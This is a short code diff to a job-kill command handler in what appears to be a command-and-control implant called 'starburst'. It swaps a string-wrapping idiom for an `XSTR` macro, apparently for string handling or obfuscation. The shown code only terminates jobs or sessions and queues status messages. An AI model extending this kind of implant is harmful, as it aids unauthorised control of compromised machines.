@@ -23,7 +23,7 @@ auto declfn starburst::cmd_jobkill(
 
     if ( !target_uuid || target_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "missing task id" ) ) );
+            XSTR( "missing task id" ) );
         return;
     }
 
@@ -43,10 +43,10 @@ auto declfn starburst::cmd_jobkill(
             job.h_thread = nullptr;
 
             queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-                symbol<char*>( const_cast<char*>( "job killed" ) ) );
+                XSTR( "job killed" ) );
 
             queue_response( inst, job.task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "task killed by operator" ) ) );
+                XSTR( "task killed by operator" ) );
             return;
         }
     }
@@ -61,17 +61,17 @@ auto declfn starburst::cmd_jobkill(
             session.active = false;
 
             queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-                symbol<char*>( const_cast<char*>( "interactive session killed" ) ) );
+                XSTR( "interactive session killed" ) );
 
             queue_response( inst, session.task_uuid, RESPONSE_SUCCESS,
-                symbol<char*>( const_cast<char*>( "session terminated by operator" ) ) );
+                XSTR( "session terminated by operator" ) );
             return;
         }
     }
 #endif
 
     queue_response( inst, task_uuid, RESPONSE_ERROR,
-        symbol<char*>( const_cast<char*>( "job not found" ) ) );
+        XSTR( "job not found" ) );
 }
 
 #endif
